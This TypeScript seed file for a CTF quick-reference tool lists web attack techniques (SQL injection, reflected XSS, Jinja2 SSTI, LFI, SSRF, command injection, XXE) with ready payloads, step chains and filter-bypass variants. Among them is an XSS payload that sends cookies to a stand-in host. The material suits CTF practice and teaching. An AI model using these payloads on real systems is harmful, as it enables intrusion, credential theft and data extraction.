// CTF 题型速查种子数据（批次 M）：Web 域。
// 条目内容全部指向项目载荷知识库已有条目（scripts/legacy-seed/webPayloads.ts），点击跳载荷 tab 对应条目；
// 不在此重复建设知识内容，宁缺毋滥。

import type { CheatEntry } from './index';

export const webCheatEntries: CheatEntry[] = [
  {
    id: 'web-sqli-union',
    title: { zh: '联合查询注入（UNION）', en: 'UNION query injection' },
    summary: {
      zh: '列数对上就能直接回显数据，是拿 flag 最快的一条路。先用 ORDER BY 探列数，再 UNION SELECT 回显。',
      en: 'Fastest path to the flag once column counts line up. Probe columns with ORDER BY, then echo data via UNION SELECT.',
    },
    snippet: "' ORDER BY 3-- -\n' UNION SELECT 1,username,password FROM users-- -",
    tip: { zh: '回显位不对时，让前几列返回 NULL 更稳。', en: 'Use NULL for unused columns when the reflection position is unclear.' },
    jump: { kind: 'payload', id: 'sqli-union-query' },
    steps: [
      {
        title: { zh: '探列数', en: 'Probe column count' },
        snippet: "' ORDER BY 1-- -   （逐次加 1，报错前一个数即列数）",
      },
      {
        title: { zh: '定回显位', en: 'Locate echo positions' },
        snippet: "' UNION SELECT 1,2,3,4,5-- -   （页面上显示哪个数字，哪列可回显）",
      },
      {
        title: { zh: '查库', en: 'Read current database' },
        snippet: "' UNION SELECT 1,database(),version()-- -   （回显位放 database()）",
      },
      {
        title: { zh: '查表', en: 'List tables' },
        snippet: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
      },
      {
        title: { zh: '查数据', en: 'Dump data' },
        snippet: "' UNION SELECT 1,group_concat(flag),3 FROM ctf.flag-- -   （schema.table 定位后直接拉列）",
      },
    ],
    variants: [
      "'/**/UNION/**/SELECT/**/1,2,3-- -   （空格被过滤用注释符拼接）",
      "'%09UNION%09SELECT%091,2,3-- -   （空格换 tab 编码 %09）",
      "'%0aUNION%0aSELECT%0a1,2,3-- -   （空格换换行 %0a）",
      "'+UNION+SELECT+1,2,3-- -   （GET 参数里 + 即空格）",
      "WHERE table_name LIKE 'flag%'   （等号被过滤换 LIKE）",
      "WHERE id REGEXP '^flag$'   （等号换正则，BETWEEN 3 AND 8 可做长度差分）",
    ],
  },
  {
    id: 'web-sqli-time-based',
    title: { zh: '时间盲注', en: 'Time-based blind injection' },
    summary: {
      zh: '页面无回显时靠响应延迟一位位猜数据，脚本按字符二分最快。',
      en: 'When the page shows nothing, leak data one character at a time via response delays; binary-search per character.',
    },
    snippet: "1' AND IF(SUBSTRING(database(),1,1)='c', SLEEP(3), 0)-- -",
    tip: { zh: '注意平台请求超时，延迟别设太长；先猜库名再猜表。', en: 'Mind request timeouts; keep delays short and pivot database → tables.' },
    jump: { kind: 'payload', id: 'sqli2-time-based-blind-sqli' },
    steps: [
      {
        title: { zh: '探针确认', en: 'Confirm injection' },
        snippet: "1' AND SLEEP(3)-- -   （响应慢 3 秒即注入点成立）",
      },
      {
        title: { zh: '逐字符猜库名', en: 'Brute database name' },
        snippet: "1' AND IF(SUBSTRING(database(),1,1)='c', SLEEP(3), 0)-- -   （按位二分）",
      },
      {
        title: { zh: '切表切列', en: 'Pivot to tables' },
        snippet: "1' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='f', SLEEP(3), 0)-- -",
      },
      {
        title: { zh: '逐位拉 flag', en: 'Leak flag bitwise' },
        snippet: "1' AND IF(ASCII(SUBSTRING((SELECT flag FROM ctf.flag LIMIT 0,1),1,1))>100, SLEEP(3), 0)-- -",
      },
    ],
    variants: [
      "AND IF(cond, BENCHMARK(5000000, MD5('x')), 0)   （SLEEP 被过滤换 BENCHMARK 空转）",
      "AND (SELECT COUNT(*) FROM flag WHERE ...)>0   （IF 被过滤换布尔差分：真/假页面态二分）",
      "AND ORD(MID((SELECT flag FROM ctf.flag LIMIT 0,1),1,1))=102   （SUBSTRING 换 MID，ASCII 换 ORD）",
    ],
  },
  {
    id: 'web-xss-reflected',
    title: { zh: '反射型 XSS', en: 'Reflected XSS' },
    summary: {
      zh: '输入点回显在页面里就能试标签逃逸；CTF 里常配合 bot 接收 cookie。',
      en: 'If input is reflected into the page, test tag breakout; pair with a bot to exfiltrate cookies.',
    },
    snippet: '<img src=x onerror="fetch(`//your.host/?c=`+document.cookie)">',
    tip: { zh: '先确认过滤了什么：标签、事件、括号还是关键字，再挑绕过姿势。', en: 'Fingerprint the filter first (tags, events, parens, keywords), then pick a bypass.' },
    jump: { kind: 'payload', id: 'xss-reflected' },
    steps: [
      {
        title: { zh: '探针', en: 'Probe' },
        snippet: '<script>alert(1)</script> 与 "<>() 混投，看哪些字符被过滤或转义',
      },
      {
        title: { zh: '事件句柄', en: 'Event handler' },
        snippet: '<img src=x onerror=alert(1)>   （script 标签黑名单时换 img 事件）',
      },
      {
        title: { zh: '外带', en: 'Exfiltrate' },
        snippet: '<img src=x onerror="fetch(`//your.host/?c=`+document.cookie)">   （配合 bot 收 cookie）',
      },
    ],
    variants: [
      '<svg onload=alert(1)> / <body onload=alert(1)>   （img 被过滤换其他标签事件）',
      '<ScRiPt>alert(1)</sCrIpT>   （关键字过滤不分大小写时大小写混淆）',
      '<img src=x onerror=alert`1`>   （括号被过滤用反引号调用）',
      '<a href="javascript:alert(1)">x</a>   （事件被过滤走 href 伪协议）',
      '<scr<script>ipt>alert(1)</script>   （过滤只做单次替换时双写绕过）',
    ],
  },
  {
    id: 'web-ssti-jinja2',
    title: { zh: 'SSTI 模板注入（Jinja2）', en: 'SSTI (Jinja2)' },
    summary: {
      zh: '模板表达式被当代码执行，{{7*7}} 回显 49 即确认；Jinja2 沿 __mro__ 找到 os 模块。',
      en: 'Template expressions execute as code: {{7*7}} returning 49 confirms it; walk __mro__ to reach os.',
    },
    snippet: '{{7*7}}\n{{ config.__class__.__init__.__globals__[\'os\'].popen(\'cat /flag\').read() }}',
    tip: { zh: '先分清引擎：{{7*7}}=49 是 Jinja2，<%= 7*7 %> 是 ERB/EJS 系。', en: 'Identify the engine first: {{7*7}}=49 means Jinja2; <%= 7*7 %> means ERB/EJS family.' },
    jump: { kind: 'payload', id: 'ssti-jinja2' },
    steps: [
      {
        title: { zh: '探针', en: 'Probe' },
        snippet: '{{7*7}}   （回显 49 即模板注入成立）',
      },
      {
        title: { zh: '判引擎', en: 'Fingerprint engine' },
        snippet: "{{7*'7'}}   （回显 7777777 是 Jinja2；<%= 7*7 %> 是 ERB/EJS 系）",
      },
      {
        title: { zh: '走链', en: 'Walk the chain' },
        snippet: "{{ ''.__class__.__mro__[1].__subclasses__() }}   （列出子类定位 os._wrap_close 的序号）",
      },
      {
        title: { zh: '读 flag', en: 'Read the flag' },
        snippet: "{{ c.__init__.__globals__['popen']('cat /flag').read() }}   （c 为定位到的子类实例）",
      },
    ],
    variants: [
      '{{ config }}   （无过滤时最短路径，直接翻配置找 secret/flag）',
      "{{ lipsum.__globals__['os'].popen('cat /flag').read() }}   （lipsum 全局对象直达 os，免 __mro__）",
      "{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}   （class 被过滤时走全局对象 cycler）",
    ],
  },
  {
    id: 'web-lfi-traversal',
    title: { zh: '目录穿越 / 文件包含', en: 'Path traversal / LFI' },
    summary: {
      zh: '参数能带文件名就试 ../ 回溯读 /flag、/etc/passwd；PHP 站点优先试 filter 伪协议。',
      en: 'If a parameter takes a filename, walk up with ../ to read /flag or /etc/passwd; on PHP try the filter wrapper first.',
    },
    snippet: '?file=../../../../etc/passwd\n?file=php://filter/convert.base64-encode/resource=/flag',
    tip: { zh: '被过滤时试双写 ....// 或绝对路径；日志注入可搭配文件包含拿 shell。', en: 'On filters try ....// or absolute paths; log poisoning chains into LFI for a shell.' },
    jump: { kind: 'payload', id: 'lfi-traversal-marker-read-boundary' },
  },
  {
    id: 'web-ssrf-basic',
    title: { zh: 'SSRF 内网探测', en: 'SSRF basics' },
    summary: {
      zh: '服务器替你发请求：打内网服务、云 metadata（169.254.169.254）常直接出 flag。',
      en: 'The server requests on your behalf: hit internal services or cloud metadata (169.254.169.254) for flags.',
    },
    snippet: '?url=http://127.0.0.1:8080/admin\n?url=http://169.254.169.254/latest/meta-data/',
    tip: { zh: '只认域名时用 DNS 重绑定或 @ 符号绕过；gopher 协议可转任意 TCP 报文。', en: 'For allowlists try DNS rebinding or the @ trick; gopher turns SSRF into raw TCP.' },
    jump: { kind: 'payload', id: 'ssrf-basic' },
  },
  {
    id: 'web-command-injection',
    title: { zh: '命令注入', en: 'Command injection' },
    summary: {
      zh: '输入拼进系统命令时用管道/分号追加自己的命令；无回显可外带或写文件。',
      en: 'When input lands in a system command, append yours with pipes or semicolons; exfiltrate or write to a file if blind.',
    },
    snippet: '127.0.0.1; cat /flag*\n127.0.0.1 && find / -name "flag*" 2>/dev/null',
    tip: { zh: '过滤分号就换 `、$()、%0a（换行）；空格被过滤用 ${IFS}。', en: 'Swap semicolons for backticks, $(), or %0a; replace spaces with ${IFS}.' },
    jump: { kind: 'payload', id: 'rce-command-injection' },
    variants: [
      'cat${IFS}/flag   （空格被过滤换 ${IFS}，同理 $IFS$9、< 重定向）',
      '127.0.0.1`cat /flag`   （分号被过滤换反引号执行）',
      '127.0.0.1$(cat /flag)   （反引号被过滤换命令替换 $()）',
      '127.0.0.1%0acat /flag   （换行符 %0a 兼做命令分隔）',
    ],
  },
  {
    id: 'web-xxe-basic',
    title: { zh: 'XXE 实体注入', en: 'XXE basics' },
    summary: {
      zh: 'XML 输入点解析外部实体就能读文件；有回显直接读，无回显走 OOB 外带。',
      en: 'If XML input is parsed with external entities, read files directly — or go OOB when blind.',
    },
    snippet: '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag">]>\n<r>&xxe;</r>',
    tip: { zh: 'PHP 协议可读 base64 绕过内容校验；Java 栈常支持 jar:///netrc 等姿势。', en: 'php://filter base64-encodes contents; Java stacks support jar:// and friends.' },
    jump: { kind: 'payload', id: 'xxe-basic' },
  },
];
